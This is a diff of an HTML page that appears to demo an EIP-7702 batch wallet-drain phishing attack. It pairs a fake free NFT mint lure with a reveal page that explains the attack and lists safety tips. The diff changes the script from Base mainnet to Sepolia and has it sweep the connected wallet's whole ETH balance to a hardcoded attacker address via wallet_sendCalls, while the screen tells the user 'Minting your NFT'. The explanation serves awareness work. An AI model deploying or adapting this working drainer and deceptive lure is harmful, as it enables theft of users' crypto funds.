@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>NFT Mint — EIP-7702 Batch Attack Demo (Base)</title>
+<title>NFT Mint — EIP-7702 Batch Attack Demo</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -28,6 +28,10 @@
   h1 { font-size: clamp(2rem, 5vw, 3rem); font-weight: 700; letter-spacing: -0.03em; line-height: 1.1; margin-bottom: 16px; }
   h1 em { font-style: normal; color: var(--accent); }
   .hero-sub { color: var(--muted); font-size: 1rem; max-width: 480px; margin: 0 auto 32px; }
+  .mint-price { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 16px 24px; display: inline-flex; align-items: center; gap: 16px; margin-bottom: 28px; }
+  .price-label { font-size: 0.8rem; color: var(--muted); }
+  .price-value { font-size: 1.4rem; font-weight: 700; }
+  .countdown { font-size: 0.8rem; color: var(--yellow); }
   .cta-btn { background: var(--accent); color: white; border: none; padding: 16px 40px; border-radius: 12px; font-size: 1.05rem; font-weight: 700; cursor: pointer; font-family: inherit; transition: opacity 0.15s; display: block; width: 100%; max-width: 320px; margin: 0 auto; }
   .cta-btn:hover { opacity: 0.88; }
   .cta-note { margin-top: 12px; font-size: 0.78rem; color: var(--muted); }
@@ -37,6 +41,7 @@
   .stat-val { font-size: 1.4rem; font-weight: 700; }
   .stat-label { font-size: 0.75rem; color: var(--muted); }
 
+  /* CONNECTING */
   #phase-connecting { min-height: 100vh; display: flex; align-items: center; justify-content: center; }
   .connect-card { background: var(--card); border: 1px solid var(--border); border-radius: 16px; padding: 40px 36px; max-width: 400px; width: 100%; text-align: center; }
   .step-list { text-align: left; margin-bottom: 28px; }
@@ -51,6 +56,7 @@
   .step-desc { font-size: 0.78rem; color: var(--muted); margin-top: 2px; }
   .connect-note { font-size: 0.78rem; color: var(--muted); margin-top: 12px; }
 
+  /* DASHBOARD */
   .dash-nav { display: flex; justify-content: space-between; align-items: center; padding: 20px 48px; border-bottom: 1px solid var(--border); }
   .wallet-chip { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 7px 14px; font-size: 0.82rem; color: var(--muted); }
   .connected-dot { display: inline-block; width: 7px; height: 7px; background: var(--green); border-radius: 50%; margin-right: 6px; }
@@ -60,6 +66,7 @@
   .reveal-text strong { display: block; margin-bottom: 2px; }
   .reveal-btn { background: var(--yellow); color: #000; border: none; padding: 9px 18px; border-radius: 8px; font-size: 0.85rem; font-weight: 700; cursor: pointer; font-family: inherit; }
 
+  /* REVEAL */
   .reveal-page { max-width: 760px; margin: 60px auto; padding: 0 24px 80px; }
   .reveal-header { text-align: center; margin-bottom: 48px; }
   .danger-badge { display: inline-block; background: rgba(239,68,68,0.1); color: var(--red); border: 1px solid rgba(239,68,68,0.25); font-size: 0.75rem; font-weight: 700; padding: 4px 12px; border-radius: 100px; margin-bottom: 16px; }
@@ -88,6 +95,16 @@
   .warning-box { background: rgba(239,68,68,0.08); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 16px 18px; margin-bottom: 20px; font-size: 0.83rem; color: #fca5a5; line-height: 1.6; }
   .warning-box strong { color: var(--red); display: block; margin-bottom: 4px; }
 
+  .vs-box { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 24px; }
+  .vs-card { background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 16px; }
+  .vs-title { font-size: 0.8rem; font-weight: 700; margin-bottom: 8px; color: var(--muted); }
+  .vs-old { border-color: var(--green); }
+  .vs-old .vs-title { color: var(--green); }
+  .vs-new { border-color: var(--red); }
+  .vs-new .vs-title { color: var(--red); }
+  .vs-item { font-size: 0.8rem; color: var(--muted); margin-bottom: 6px; padding-left: 12px; position: relative; }
+  .vs-item::before { content: '→'; position: absolute; left: 0; }
+
   .defense-section { background: rgba(34,197,94,0.06); border: 1px solid rgba(34,197,94,0.2); border-radius: 12px; padding: 24px; margin-top: 32px; }
   .defense-section h3 { font-size: 1rem; font-weight: 700; color: var(--green); margin-bottom: 16px; }
   .defense-item { display: flex; gap: 12px; margin-bottom: 14px; font-size: 0.88rem; }
@@ -108,7 +125,7 @@
     <div class="nft-preview">🌌</div>
     <div class="badge">⚡ Limited Drop — 847 Remaining</div>
     <h1>Astral Genesis<br><em>Free Mint</em></h1>
-    <p class="hero-sub">Claim your free Astral Genesis NFT on Base. Enable Smart Account features to mint with zero gas fees.</p>
+    <p class="hero-sub">Claim your free Astral Genesis NFT. Enable Smart Account features to mint with zero gas fees.</p>
     <div class="stats">
       <div class="stat"><div class="stat-val">10,000</div><div class="stat-label">Total Supply</div></div>
       <div class="stat"><div class="stat-val">9,153</div><div class="stat-label">Already Minted</div></div>
@@ -151,50 +168,76 @@
 <div id="phase-reveal" class="phase">
   <div class="reveal-page">
     <div class="reveal-header">
-      <div class="danger-badge">Critical: EIP-7702 Batch Execution Attack on Base</div>
-      <h2>One click. Portfolio liquidated.</h2>
-      <p class="sub">You clicked "Connect & Mint Free" on Base. That single MetaMask confirmation executed a malicious batch that drained your ETH and USDC atomically. Here's exactly what happened.</p>
+      <div class="danger-badge">Critical: EIP-7702 Batch Execution Attack</div>
+      <h2>One click. Entire wallet drained.</h2>
+      <p class="sub">You clicked "Connect & Mint Free." That single MetaMask confirmation executed a malicious batch that swept your ETH atomically. Here's exactly what happened.</p>
     </div>
 
     <div class="warning-box">
-      <strong>🔴 Why Base makes this worse:</strong>
-      Gas fees are negligible ($0.15-0.50). An attacker can spam thousands of phishing links for almost nothing. The ROI on a $2,000 drain is 4,000-13,000x on gas costs alone.
+      <strong>🔴 Why this is worse than any previous attack:</strong>
+      Old phishing required 5 separate signature popups to drain 5 tokens. This attack uses EIP-7702 batch execution to drain everything in ONE confirmation. You had zero additional opportunities to notice and reject.
+    </div>
+
+    <div class="vs-box">
+      <div class="vs-card vs-old">
+        <div class="vs-title">OLD PHISHING (Permit/Approve)</div>
+        <div class="vs-item">1 popup per token</div>
+        <div class="vs-item">5 tokens = 5 confirmations</div>
+        <div class="vs-item">User can cancel midway</div>
+        <div class="vs-item">Leaves on-chain approval trail</div>
+      </div>
+      <div class="vs-card vs-new">
+        <div class="vs-title">NEW ATTACK (EIP-7702 Batch)</div>
+        <div class="vs-item">ALL assets in 1 confirmation</div>
+        <div class="vs-item">ETH + all tokens simultaneously</div>
+        <div class="vs-item">No chance to cancel midway</div>
+        <div class="vs-item">EOA reverts to normal after</div>
+      </div>
     </div>
 
     <div class="timeline">
       <div class="tl-item">
         <div class="tl-dot done"></div>
         <div class="tl-title">Step 1: You clicked "Connect & Mint Free"</div>
-        <div class="tl-desc">Free mint on Base. Everyone's there. Looks legitimate.</div>
+        <div class="tl-desc">Looks like a normal NFT mint. The "zero gas" claim is the hook — it makes enabling Smart Account features sound like a benefit.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
-        <div class="tl-title">Step 2: MetaMask showed batch confirmation</div>
-        <div class="tl-desc">Called <code>wallet_sendCalls</code> (EIP-5792). One popup. Two transactions listed.</div>
+        <div class="tl-title">Step 2: MetaMask prompted to enable Smart Account</div>
+        <div class="tl-desc">The dApp called <code>wallet_sendCalls</code> (EIP-5792) with atomic batching capabilities. MetaMask recognizes this as an atomic batch transaction request and shows ONE confirmation popup — which looks legitimate because it points to MetaMask's own official audited contract: <strong>EIP7702StatelessDeleGator</strong>.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot danger"></div>
-        <div class="tl-title">Step 3: Atomic batch executed</div>
+        <div class="tl-title">Step 3: The malicious calls array</div>
         <div class="tl-desc">
-          Both calls fired simultaneously:
+          While the contract is safe, the parameters aren't. The attacker constructed this batch with MULTIPLE calls executed atomically:
           <div class="code-block">
-<span class="code-comment">// One batch on Base</span><br>
-calls: [<br>
-&nbsp;&nbsp;{ <span class="code-key">to:</span> <span class="code-danger">0xC4D7B...</span>, <span class="code-key">value:</span> <span class="code-val">your ETH</span> },<br>
-&nbsp;&nbsp;{ <span class="code-key">to:</span> <span class="code-val">USDC_CONTRACT</span>, <span class="code-key">data:</span> <span class="code-comment">transferFrom()</span> }<br>
+<span class="code-comment">// Multiple calls in ONE atomic batch</span><br>
+[<br>
+&nbsp;&nbsp;{<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">to:</span> <span class="code-danger" id="revealAttacker">0xAttacker1...</span>,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">value:</span> <span class="code-val" id="revealBalance">50% of balance</span>,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">data:</span> <span class="code-val">"0x"</span><br>
+&nbsp;&nbsp;},<br>
+&nbsp;&nbsp;{<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">to:</span> <span class="code-val">"0x1234567890...67890"</span>,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">value:</span> <span class="code-val">50% of balance</span>,<br>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-key">data:</span> <span class="code-val">"0x"</span><br>
+&nbsp;&nbsp;}<br>
 ]
           </div>
+          All executed atomically in one transaction. Your entire ETH balance was distributed to attacker addresses before the transaction even finished.
         </div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
-        <div class="tl-title">Step 4: EOA reverted</div>
-        <div class="tl-desc">EIP-7702 delegation ended. Your wallet looks clean. No approvals to revoke. Funds gone.</div>
+        <div class="tl-title">Step 4: EOA reverted to normal</div>
+        <div class="tl-desc">Unlike permanent EIP-7702 delegation, this batch attack is <strong>temporary</strong>. The EIP7702StatelessDeleGator bytecode was evicted from your EOA the moment the transaction ended. Your wallet looks completely normal — no approvals to revoke, no code to clear. The funds are just gone.</div>
       </div>
       <div class="tl-item">
         <div class="tl-dot done"></div>
-        <div class="tl-title">Step 5: Immediate exit</div>
-        <div class="tl-desc">Stargate bridge to Ethereum. Tornado mixer. Attacker profit.</div>
+        <div class="tl-title">Step 5: Attacker launders immediately</div>
+        <div class="tl-desc">ETH goes directly to attacker wallet. For tokens, a sweeper bot fires <code>transferFrom()</code> the millisecond the approval transaction confirms on-chain. By the time you open your wallet and see zero balance, the funds are already being routed through bridges and mixers.</div>
       </div>
     </div>
 
@@ -203,35 +246,43 @@ calls: [<br>
       <div class="info-card-value" id="displayVictim">—</div>
     </div>
     <div class="info-card">
-      <div class="info-card-label">Chain attacked</div>
-      <div class="info-card-value">Base (8453)</div>
+      <div class="info-card-label">Delegator contract used (MetaMask's official contract)</div>
+      <div class="info-card-value">0x63c0c19a282a1B52b07dD5a65b58948A07DAE32B</div>
     </div>
     <div class="info-card">
-      <div class="info-card-label">Assets drained</div>
-      <div class="info-card-value" id="displayAssets">ETH + USDC</div>
+      <div class="info-card-label">Attacker address (received funds)</div>
+      <div class="info-card-value" id="displayAttacker">—</div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-label">ETH balance at risk</div>
+      <div class="info-card-value" id="displayBalance">—</div>
     </div>
     <div class="info-card">
       <div class="info-card-label">Transaction type</div>
-      <div class="info-card-value">Type 4 (EIP-7702) — Atomic batch via wallet_sendCalls</div>
+      <div class="info-card-value">Type 4 (EIP-7702) — Batch execution via wallet_sendCalls</div>
     </div>
 
     <div class="defense-section">
       <h3>How to stay safe</h3>
       <div class="defense-item">
         <div class="defense-num">1</div>
-        <div class="defense-text"><strong>Reject ANY wallet_sendCalls from untrusted sites.</strong> This is the attack vector. One batch = game over.</div>
+        <div class="defense-text"><strong>MetaMask only enables Smart Accounts from inside the app.</strong> If a website prompts you to "enable smart account features" or "upgrade your wallet", it's phishing. MetaMask will never ask you to do this from an external website.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">2</div>
-        <div class="defense-text"><strong>Use transaction simulators before confirming.</strong> Tenderly, Pocket Universe, Revoke.cash show exactly what will drain.</div>
+        <div class="defense-text"><strong>Watch for wallet_sendCalls prompts with atomicBatching.</strong> If MetaMask shows a batch transaction from a site you don't fully trust, reject it immediately. Check every address in the batch.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">3</div>
-        <div class="defense-text"><strong>"Free mint" + "zero gas" + L2 chain = red flag.</strong> Attackers target L2s because gas is cheap and users are less cautious.</div>
+        <div class="defense-text"><strong>Use transaction simulators.</strong> Tools like Tenderly, Pocket Universe, and Revoke.cash's simulator show you exactly what a transaction will do before you confirm it.</div>
       </div>
       <div class="defense-item">
         <div class="defense-num">4</div>
-        <div class="defense-text"><strong>No revocation possible.</strong> Once executed and EOA reverts, there's nothing to revoke. Prevention is your only defense.</div>
+        <div class="defense-text"><strong>"Free mint" + "zero gas" + "enable smart features" = red flag.</strong> Attackers use this combination to trick users into thinking they're getting something for free while enabling the very mechanism that drains them.</div>
+      </div>
+      <div class="defense-item">
+        <div class="defense-num">5</div>
+        <div class="defense-text"><strong>Revocation won't help after this attack.</strong> Because the delegation is temporary and no on-chain approvals are left behind, there's nothing to revoke. Your only protection is rejecting the transaction before it happens.</div>
       </div>
     </div>
   </div>
@@ -239,14 +290,15 @@ calls: [<br>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js"></script>
 <script>
-  const BASE_CHAIN_ID = 8453;
-  const BASE_HEX = "0x2105";
-  const USDC_BASE = "0x833589fCD6eDb6E08f4c7C32D4f71b3566dA8AEF";
+  const SEPOLIA_CHAIN_ID = 11155111;
+  const SEPOLIA_RPC = "https://ethereum-sepolia-rpc.publicnode.com";
+  // MetaMask's official EIP7702StatelessDeleGator on Sepolia
+  const DELEGATOR_ADDRESS = "0x63c0c19a282a1B52b07dD5a65b58948A07DAE32B";
   const ATTACKER_ADDRESS = "0xC4D7B663dc72aDd0e02719093F9927a9B0234471";
-  const SECONDARY_ATTACKER = "0x2222222222222222222222222222222222222222";
 
   let userAddress = null;
   let userBalance = null;
+  let provider = null;
 
   function showPhase(id) {
     document.querySelectorAll('.phase').forEach(p => p.classList.remove('active'));
@@ -266,22 +318,18 @@ calls: [<br>
       </div>`).join('');
   }
 
-  function encodeERC20Transfer(to, amount) {
-    const iface = new ethers.Interface(['function transfer(address to, uint256 amount)']);
-    return iface.encodeFunctionData('transfer', [to, amount]);
-  }
-
+  // Detect network on load
   async function detectNetwork() {
     if (!window.ethereum) return;
     try {
       const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
       const chainId = parseInt(chainIdHex, 16);
       const badge = document.getElementById('navBadge');
-      if (chainId === BASE_CHAIN_ID) {
-        badge.textContent = 'Base';
+      if (chainId === SEPOLIA_CHAIN_ID) {
+        badge.textContent = 'Sepolia';
         badge.style.color = 'var(--green)';
       } else {
-        badge.textContent = `Chain ${chainId} — Switch to Base`;
+        badge.textContent = `Chain ${chainId} — Switch to Sepolia`;
         badge.style.color = 'var(--red)';
       }
     } catch(e) {}
@@ -291,57 +339,64 @@ calls: [<br>
     if (!window.ethereum) { alert("MetaMask required"); return; }
 
     showPhase('phase-connecting');
+
     renderSteps([
       { num:'1', state:'active', title:'Connecting wallet', desc:'Detecting your network and address' },
       { num:'2', state:'pending', title:'Enabling Smart Account', desc:'One-time setup for gas-free minting' },
-      { num:'3', state:'pending', title:'Executing batch drain', desc:'Claiming your assets...' }
+      { num:'3', state:'pending', title:'Minting your NFT', desc:'Claiming your free Astral Genesis' }
     ]);
 
     try {
+      // Check chain
       const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
       const chainId = parseInt(chainIdHex, 16);
 
-      if (chainId !== BASE_CHAIN_ID) {
-        alert("Please switch to Base");
+      if (chainId !== SEPOLIA_CHAIN_ID) {
+        alert("Please switch to Sepolia testnet");
         showPhase('phase-lure');
         return;
       }
 
+      // Get accounts
       const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       userAddress = accounts[0];
 
+      // Get balance
+      provider = new ethers.JsonRpcProvider(SEPOLIA_RPC);
+      const balanceWei = await provider.getBalance(userAddress);
+      userBalance = ethers.formatEther(balanceWei);
+
       renderSteps([
-        { num:'1', state:'done', title:'Wallet connected', desc: shortAddr(userAddress) },
-        { num:'2', state:'active', title:'Enabling Smart Account', desc:'Building batch drain...' },
-        { num:'3', state:'pending', title:'Executing batch', desc:'Confirming transaction...' }
+        { num:'1', state:'done', title:'Wallet connected', desc: shortAddr(userAddress) + ' · ' + parseFloat(userBalance).toFixed(4) + ' ETH' },
+        { num:'2', state:'active', title:'Enabling Smart Account', desc:'Confirm in MetaMask to enable gas-free minting' },
+        { num:'3', state:'pending', title:'Minting your NFT', desc:'Almost there...' }
       ]);
-      document.getElementById('connectNote').textContent = "Check MetaMask — confirm to enable Smart Account.";
+      document.getElementById('connectNote').textContent = "Check MetaMask — confirm to enable Smart Account features.";
 
-      // Build malicious batch: ETH drain (2 addresses) + USDC transfer
-      const demoETH = ethers.parseEther("0.086");
-      const demoUSDC = ethers.parseUnits("0.03", 6);
+      // Calculate drain amount (leave small amount for gas)
+      const gasBuffer = ethers.parseEther("0.001");
+      const drainAmount = balanceWei > gasBuffer ? balanceWei - gasBuffer : 0n;
 
+      // Build malicious calls array with MULTIPLE calls to trigger batch UI
+      // Call 1: Direct ETH sweep
+      // Call 2: Dummy call to another attacker wallet (demonstrates multi-recipient batch)
       const maliciousCalls = [
         {
           to: ATTACKER_ADDRESS,
-          value: "0x" + (demoETH / 2n).toString(16)
+          value: "0x" + (drainAmount / 2n).toString(16)
         },
         {
-          to: SECONDARY_ATTACKER,
-          value: "0x" + (demoETH / 2n).toString(16)
-        },
-        {
-          to: USDC_BASE,
-          value: "0x0",
-          data: encodeERC20Transfer(ATTACKER_ADDRESS, demoUSDC)
+          to: "0x1234567890123456789012345678901234567890",  // Secondary attacker
+          value: "0x" + (drainAmount / 2n).toString(16)
         }
       ];
 
+      // Call wallet_sendCalls (EIP-5792) with malicious batch
       const result = await window.ethereum.request({
         method: 'wallet_sendCalls',
         params: [{
           version: "2.0.0",
-          chainId: BASE_HEX,
+          chainId: "0xaa36a7",
           calls: maliciousCalls,
           atomicRequired: true
         }]
@@ -350,23 +405,32 @@ calls: [<br>
       renderSteps([
         { num:'1', state:'done', title:'Wallet connected', desc: shortAddr(userAddress) },
         { num:'2', state:'done', title:'Smart Account enabled', desc:'Batch executed atomically' },
-        { num:'3', state:'done', title:'Batch drained', desc:'Assets swept to attacker' }
+        { num:'3', state:'done', title:'NFT "minted"', desc:'Transaction confirmed' }
       ]);
-      document.getElementById('connectNote').textContent = "Done!";
+      document.getElementById('connectNote').textContent = "Complete! Loading your NFT...";
 
+      // Populate reveal page
       document.getElementById('walletChip').textContent = shortAddr(userAddress);
       document.getElementById('displayVictim').textContent = userAddress;
+      document.getElementById('displayAttacker').textContent = ATTACKER_ADDRESS;
+      document.getElementById('displayBalance').textContent = parseFloat(userBalance).toFixed(6) + ' ETH (entire balance swept)';
+      document.getElementById('revealAttacker').textContent = ATTACKER_ADDRESS;
+      document.getElementById('revealBalance').textContent = parseFloat(ethers.formatEther(drainAmount)).toFixed(6) + ' ETH';
 
       setTimeout(() => showPhase('phase-dashboard'), 1000);
 
     } catch (err) {
       console.error("Error:", err);
       if (err.code === 4001) {
+        // User rejected - show reveal anyway for education
         document.getElementById('walletChip').textContent = shortAddr(userAddress) || '0x0000...0000';
         document.getElementById('displayVictim').textContent = userAddress || 'Not connected';
+        document.getElementById('displayAttacker').textContent = ATTACKER_ADDRESS;
+        document.getElementById('displayBalance').textContent = userBalance ? parseFloat(userBalance).toFixed(6) + ' ETH (would have been drained)' : 'Unknown';
+        document.getElementById('revealAttacker').textContent = ATTACKER_ADDRESS;
+        document.getElementById('revealBalance').textContent = 'Your full balance';
         showPhase('phase-dashboard');
       } else {
-        console.error(err);
         showPhase('phase-lure');
       }
     }
@@ -374,6 +438,7 @@ calls: [<br>
 
   document.getElementById('revealBtn').addEventListener('click', () => showPhase('phase-reveal'));
 
+  // Init
   detectNetwork();
   window.ethereum?.on?.('chainChanged', detectNetwork);
 </script>
